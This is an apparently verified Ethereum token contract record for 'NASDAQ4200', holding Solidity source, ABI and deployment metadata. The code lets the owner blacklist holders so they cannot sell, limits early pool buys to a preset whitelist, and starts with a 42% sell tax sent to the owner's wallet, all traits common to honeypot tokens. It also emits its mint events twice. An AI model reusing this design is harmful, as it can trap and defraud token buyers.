{"SourceCode": "//SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function decimals() external view returns (uint8);\r\n    function symbol() external view returns (string memory);\r\n    function name() external view returns (string memory);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed _owner, address indexed spender, uint256 value);\r\n}\r\n\r\ninterface IUniswapV2Factory { \r\n    function createPair(address tokenA, address tokenB) external returns (address pair); \r\n}\r\ninterface IUniswapV2Router02 {\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;\r\n    function WETH() external pure returns (address);\r\n    function factory() external pure returns (address);\r\n    function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n}\r\n\r\nabstract contract Auth {\r\n    address internal _owner;\r\n    event OwnershipTransferred(address _owner);\r\n    constructor(address creatorOwner) { _owner = creatorOwner; }\r\n    modifier onlyOwner() { require(msg.sender == _owner, \"Only owner can call this\"); _; }\r\n    function owner() public view returns (address) { return _owner; }\r\n    function renounceOwnership() external onlyOwner { \r\n        _owner = address(0); \r\n        emit OwnershipTransferred(address(0)); \r\n    }\r\n}\r\n\r\ncontract Nasdaq is IERC20, Auth {\r\n    string private constant _name         = \"NASDAQ4200\";\r\n    string private constant _symbol       = \"NASDAQ\";\r\n    uint8 private constant _decimals      = 18;\r\n    uint256 private constant _totalSupply = 1_000_000_000 * (10**_decimals);\r\n\r\n    uint256 private _initialBuyTax=15;\r\n    uint256 private _initialSellTax=42;\r\n    uint256 private _midSellTax=15;\r\n    uint256 private _finalBuyTax=1;\r\n    uint256 private _finalSellTax=1;\r\n    uint256 public _reduceBuyTaxAt=69;\r\n    uint256 public _reduceSellTax1At=100;\r\n    uint256 public _reduceSellTax2At=420;\r\n    uint256 private _preventSwapBefore=30;\r\n    uint256 public _buyCount=0;\r\n\r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    mapping (address => bool) public isBlackListed;\r\n    mapping (address => bool) private isWhitelisted;\r\n    mapping (address => bool) private _noFees;\r\n    mapping(address => uint256) private _holderLastTransferTimestamp;\r\n\r\n    address payable private _walletTax;\r\n    uint256 private constant _taxSwapMin = _totalSupply / 200000;\r\n    uint256 private constant _taxSwapMax = _totalSupply / 500;\r\n  \r\n    address private constant _swapRouterAddress = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n    IUniswapV2Router02 private _primarySwapRouter = IUniswapV2Router02(_swapRouterAddress);\r\n    address private _primaryLP;\r\n    mapping (address => bool) private _isLP;\r\n\r\n    bool public limited = true;\r\n    bool public transferDelayEnabled = false;\r\n    uint256 public maxHoldingAmount = 20_000_001 * (10**_decimals); // 2%\r\n    uint256 public minHoldingAmount = 100_000 * (10**_decimals); // 0.01%;\r\n    \r\n    bool private _tradingOpen;\r\n\r\n    bool private _inTaxSwap = false;\r\n    modifier lockTaxSwap { \r\n        _inTaxSwap = true; \r\n        _; \r\n        _inTaxSwap = false; \r\n    }\r\n\r\n    constructor(address[] memory _users) Auth(msg.sender) { \r\n\r\n        _balances[msg.sender] = (_totalSupply / 1000 ) * 42;\r\n        _balances[address(this)] = (_totalSupply / 1000 ) * 958;\r\n\r\n        emit Transfer(address(0), address(msg.sender), _balances[address(msg.sender)]);\r\n        emit Transfer(address(0), address(this), _balances[address(this)]);\r\n        \r\n        setTaxWallet(msg.sender);\r\n        setWhitelist(_users, true);\r\n\r\n        _walletTax = payable(msg.sender);\r\n        _noFees[_walletTax] = true;\r\n        _noFees[_owner] = true;\r\n        _noFees[address(this)] = true;\r\n  \r\n        emit Transfer(address(0), msg.sender, _balances[msg.sender]);\r\n        emit Transfer(address(0), address(this), _balances[address(this)]);\r\n    }\r\n\r\n    receive() external payable {}\r\n    \r\n    function totalSupply() external pure override returns (uint256) { return _totalSupply; }\r\n    function decimals() external pure override returns (uint8) { return _decimals; }\r\n    function symbol() external pure override returns (string memory) { return _symbol; }\r\n    function name() external pure override returns (string memory) { return _name; }\r\n    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }\r\n    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }\r\n\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _allowances[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) external override returns (bool) {\r\n        require(_checkTradingOpen(msg.sender), \"Trading not open\");\r\n        return _transferFrom(msg.sender, recipient, amount);\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {\r\n        require(_checkTradingOpen(sender), \"Trading not open\");\r\n        if(_allowances[sender][msg.sender] != type(uint256).max){\r\n            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;\r\n        }\r\n        return _transferFrom(sender, recipient, amount);\r\n    }\r\n\r\n    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {\r\n        require(sender != address(0), \"No transfers from Zero wallet\");\r\n        require(!isBlackListed[sender], \"Sender Blacklisted\");\r\n        require(!isBlackListed[recipient], \"Receiver Blacklisted\");\r\n\r\n        if (!_tradingOpen) { require(_noFees[sender], \"Trading not open\"); }\r\n        if ( !_inTaxSwap && _isLP[recipient] && _buyCount >= _preventSwapBefore) { _swapTaxAndLiquify(); }\r\n\r\n        if (limited && sender == _primaryLP) {\r\n            require(balanceOf(recipient) + amount <= maxHoldingAmount && balanceOf(recipient) + amount >= minHoldingAmount, \"Forbid\");\r\n            require(isWhitelisted[sender] || isWhitelisted[recipient], \"Forbid\");\r\n        }\r\n\r\n        if (transferDelayEnabled) {\r\n            if (recipient != _swapRouterAddress && recipient != _primaryLP) {\r\n                require(_holderLastTransferTimestamp[tx.origin] < block.number, \"Only one transfer per block allowed.\");\r\n                _holderLastTransferTimestamp[tx.origin] = block.number;\r\n            }\r\n        }\r\n\r\n        uint256 _taxAmount = _calculateTax(sender, recipient, amount);\r\n        uint256 _transferAmount = amount - _taxAmount;\r\n        _balances[sender] -= amount;\r\n        if ( _taxAmount > 0 ) { \r\n            _balances[address(this)] += _taxAmount; \r\n        }\r\n\r\n\r\n        _buyCount++;\r\n        _balances[recipient] += _transferAmount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true;\r\n    }    \r\n\r\n    function _approveRouter(uint256 _tokenAmount) internal {\r\n        if ( _allowances[address(this)][_swapRouterAddress] < _tokenAmount ) {\r\n            _allowances[address(this)][_swapRouterAddress] = type(uint256).max;\r\n            emit Approval(address(this), _swapRouterAddress, type(uint256).max);\r\n        }\r\n    }\r\n\r\n    function addLiquidity() external payable onlyOwner lockTaxSwap {\r\n        require(_primaryLP == address(0), \"LP exists\");\r\n        require(!_tradingOpen, \"trading is open\");\r\n        require(msg.value > 0 || address(this).balance>0, \"No ETH in contract or message\");\r\n        require(_balances[address(this)]>0, \"No tokens in contract\");\r\n        _primaryLP = IUniswapV2Factory(_primarySwapRouter.factory()).createPair(address(this), _primarySwapRouter.WETH());\r\n        _addLiquidity(_balances[address(this)], address(this).balance);\r\n        _isLP[_primaryLP] = true;\r\n        _tradingOpen = true;\r\n    }\r\n\r\n    function _addLiquidity(uint256 _tokenAmount, uint256 _ethAmountWei) internal {\r\n        _approveRouter(_tokenAmount);\r\n        _primarySwapRouter.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, _owner, block.timestamp );\r\n    }\r\n\r\n    function _checkTradingOpen(address sender) private view returns (bool){\r\n        bool checkResult = false;\r\n        if ( _tradingOpen ) { checkResult = true; } \r\n        else if (_noFees[sender]) { checkResult = true; } \r\n\r\n        return checkResult;\r\n    }\r\n\r\n    function setTaxWallet(address newTaxWallet) public onlyOwner {\r\n        _walletTax = payable(newTaxWallet);\r\n    }\r\n\r\n    function setBlackList(address[] memory _users, bool set) public onlyOwner {\r\n        for(uint256 i = 0; i < _users.length; i++){\r\n            isBlackListed[_users[i]] = set;\r\n        }\r\n    }\r\n\r\n    function setWhitelist(address[] memory _users, bool set) internal {\r\n        for(uint256 i = 0; i < _users.length; i++){\r\n            isWhitelisted[_users[i]] = set;\r\n        }\r\n    }\r\n\r\n    function removeLimits() external onlyOwner{\r\n        limited = false;\r\n        transferDelayEnabled=false;\r\n    }\r\n\r\n    function manuallyLowerTax() external onlyOwner{\r\n        _reduceSellTax1At=20;\r\n        _reduceSellTax2At=20;\r\n        _reduceBuyTaxAt=20;\r\n    }\r\n\r\n    function _calculateTax(address sender, address recipient, uint256 amount) internal view returns (uint256) {\r\n\r\n        uint256 taxAmount;\r\n        if ( _tradingOpen && !_noFees[sender] && !_noFees[recipient] ) { \r\n            if ( _isLP[sender] || _isLP[recipient] ) {\r\n                taxAmount = (amount / 100) * ((_buyCount > _reduceBuyTaxAt) ? _finalBuyTax : _initialBuyTax);\r\n\r\n                if(recipient == _primaryLP && sender != address(this)){\r\n\r\n                    uint256 taxRate;\r\n                    if(_buyCount > _reduceSellTax2At){\r\n                        taxRate = _finalSellTax;\r\n                    } else if(_buyCount > _reduceSellTax1At){\r\n                        taxRate = _midSellTax;\r\n                    } else {\r\n                        taxRate = _initialSellTax;\r\n                    }\r\n\r\n                    taxAmount = (amount / 100) * taxRate;\r\n                }\r\n            }\r\n        }\r\n\r\n        return taxAmount;\r\n    }\r\n\r\n    function _swapTaxAndLiquify() private lockTaxSwap {\r\n        uint256 _taxTokensAvailable = balanceOf(address(this));\r\n\r\n        if ( _taxTokensAvailable >= _taxSwapMin && _tradingOpen ) {\r\n            if ( _taxTokensAvailable >= _taxSwapMax ) { _taxTokensAvailable = _taxSwapMax; }\r\n\r\n            _swapTaxTokensForEth(_taxTokensAvailable);\r\n            uint256 _contractETHBalance = address(this).balance;\r\n\r\n            if(_contractETHBalance > 0) { \r\n                bool success;\r\n                (success,) = _walletTax.call{value: (_contractETHBalance)}(\"\");\r\n                require(success);\r\n            }\r\n        }\r\n    }\r\n\r\n    function _swapTaxTokensForEth(uint256 tokenAmount) private {\r\n        _approveRouter(tokenAmount);\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = _primarySwapRouter.WETH();\r\n        _primarySwapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount,0,path,address(this),block.timestamp);\r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"_users\",\"type\":\"address[]\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_buyCount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_reduceBuyTaxAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_reduceSellTax1At\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_reduceSellTax2At\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"addLiquidity\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isBlackListed\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limited\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"manuallyLowerTax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxHoldingAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minHoldingAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"_users\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"set\",\"type\":\"bool\"}],\"name\":\"setBlackList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newTaxWallet\",\"type\":\"address\"}],\"name\":\"setTaxWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"transferDelayEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "Nasdaq", "CompilerVersion": "v0.8.17+commit.8df45f5f", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000051000000000000000000000000cb65b7bb16b055265cd09e60f444a431b311a247000000000000000000000000b1555105a0446bd4f83778313848820b911220a90000000000000000000000005ae374318b13af080c39c44dbd6d5c67b1a825550000000000000000000000005ac7836118535b51868d8376673856daaacb9b090000000000000000000000006007c0501acca765c2f233cf5d910303539882820000000000000000000000001efae1cbf3e086db45a1dd9897af66c3298489fd0000000000000000000000004c3156fe3e48b374d83c5f4765eaa2a68595d5370000000000000000000000001373383003b02cec8b58b7418378a301bcbb1f6500000000000000000000000053bf5fd198300af6dea49ee0ad37cc9010b9b96200000000000000000000000075cf3c3a1c0e2f47049c8eb731aaed224ce1c567000000000000000000000000e3329549f41deb62bcb58585ab938932488cf9500000000000000000000000002fd9f609a775fb114a286bff724939ff614f119c0000000000000000000000008239edbde1c10bb3a3bc66f312976e790e35f99b000000000000000000000000c7b79fdffd32823b882fd0d9aea0b5f97758947100000000000000000000000020b759af46f39071e8ffcddd0a9e05db1deaa103000000000000000000000000430fe740941fe275c39cbd3b296fc7f0e65802a6000000000000000000000000fe3b407ce26ec619825d31065c04695177a68af10000000000000000000000003467b50ba9c95a1f66f6b334f5b7ee24e56a321f000000000000000000000000181531db3c9991c08dd422e3c7525c8bc12c9b83000000000000000000000000941ce9e87373c396c8a01cd3ae20de4cd91fb3510000000000000000000000008ad32430700e188c1e8a3f2c8f8e8f6862997f96000000000000000000000000a925eade90b2ddc12c32a7066c84914de55424fb000000000000000000000000e86a9128d750f9f4cabc5a6506c8dbfaa299594a00000000000000000000000038174d9b57a4c17664e679f40f204607ac6e4973000000000000000000000000ad90f6390a3efea20bd62a82ec1cd1cc9a6597b3000000000000000000000000f1dec84241fa249cdfe56763b8194e57103a3ae7000000000000000000000000d05dc3e2f51d5d78d2f01ecd1b360847a01ec83600000000000000000000000095e815e9aabad70fe2705627f865d8dbea318e5400000000000000000000000037f40e978b4e3f8392d7db9237520917671b9d26000000000000000000000000c702f7a8285fae62f8d207985823fc6e8fd77bd00000000000000000000000007bfbbf6c8c32f965fa75f9e264dbdab1774887040000000000000000000000006871a5f81bd4ce76586b698775b4bb702aca35e1000000000000000000000000bc060ec2732285f6ee02f4c56761ed57cec7c8550000000000000000000000004f5cd7571b8710d5ddd9776dc3e7b4a6216b543b0000000000000000000000008b9cf389f3ec5d4078b34c64e0e34e3ba8343442000000000000000000000000a7dabffb5ba9d0c593d720b8ee3019a746df6312000000000000000000000000fd09a72f54845322513391c2ff7f846a958ce958000000000000000000000000757d013f9b113d5891393356830872ed8b4d367c00000000000000000000000015d18745632ec5cf87286626f08ea0f5b61e1e20000000000000000000000000cf6ed95bdf8be260b8e5813b86c34fbe0d52ac280000000000000000000000005bfe3c72c988363486af84d64273ea7671556eda000000000000000000000000040daf27909b582106ad3508c29891c394df86a80000000000000000000000005f2e7a07ba37a678d5ec5ed8da429e17f7ec69cc000000000000000000000000365fe725abe99bb58cfe153707ecce622954703e000000000000000000000000a9195ed2fc34d4b6e08f8df06cd7530d347ba1ca000000000000000000000000050e88a07fa11efff0973b3bba8a5777e16d4b900000000000000000000000001593b26a698717fce82b34fc9b9d031d35544e2700000000000000000000000064ca9af549af5d2a95b190b78194f5efa1cc0fad000000000000000000000000521034a3f5e63a7cac9fd3fd9cadfa4cb6e09aa0000000000000000000000000852bf8df99c7a616b4836b2c7b75f78e4703d25100000000000000000000000076fc54fc96ae3156d8c0bd6e7ec8f3ab66dc43ee000000000000000000000000c006a59c158ca87720c5b59dd2ef893a715167eb000000000000000000000000f479a26ab63c2071cb58dbd1a93676230e234bdc0000000000000000000000000bdafae79bf37d8b0848aa8b1fcd1e6ab27420c500000000000000000000000002bf74af6ef54e3f12eee450cc804a783981efeb000000000000000000000000b7554f5cb7eb5999a277e1d416904aec978457cc0000000000000000000000008177f376f437f988cb90c2a8876191ea208e939b000000000000000000000000dd6343eed5e01b1bcbf37aae243108bf570d9ccc0000000000000000000000008e89de34cdfd8a0a3bbdf65edcf2f7e18c86ba4000000000000000000000000078ae900c9f222de78f2bc499baccf1f5443d29cd000000000000000000000000571ce13263d8a0aeb945472dc79e87d41e134976000000000000000000000000417cafba291995483f24ff749202e64a978e4c8a000000000000000000000000d4cbc5c3802e7661d1d91f85dda74ea6292cc71d00000000000000000000000021814a86a022b4ebe44cb8e196941774f65daaf0000000000000000000000000a3fe8c7e1c6ac935d5d18afbffdca5caa55bef1f00000000000000000000000000f8de46ef615bfcd5bbe7909c47c6982ee75f3a000000000000000000000000335390f332c14b2270ebfb9e6195fc3fe224f25c00000000000000000000000075738aa6a68cf40018fcb07847638b670606b2b00000000000000000000000000d04439414a16b7c80133c03a3fc2eb5d3fb83e40000000000000000000000001f82b7f1579a71e1abde5c3de5afdf9ce8a24504000000000000000000000000841a9a5ad269b9b9f5b33849b21a22754cd6c75c000000000000000000000000ec6271ad3e25b38d9bed373dbd8b76fcda9244e80000000000000000000000004cb0a358fd890cd74ab9c0a1bff151fa7f8e29040000000000000000000000003cd47a760f52ad6a26a885fc0edfa7db5a3e8afc00000000000000000000000012774092a81fe8f05a1396e899682c3a7726ada3000000000000000000000000c62c711f7dc72c1803ff6901568daab7713c0d3f000000000000000000000000344771377f74247ec6c949541af43a164ae0b0460000000000000000000000004ba718fe191892062466b10c2e2e13181050c0140000000000000000000000003519fea4c7422586404cd7d2bb67ec591b571af90000000000000000000000001ae7775c942bec25f28873d32f35c76ac13e41be00000000000000000000000051eb0015867470d794866cc17ffcdea125f5eab8", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://115e32a4a66f6fafcf7de08b4fddf9e4b3e3196cd4231cc294f45fe371676bb9"}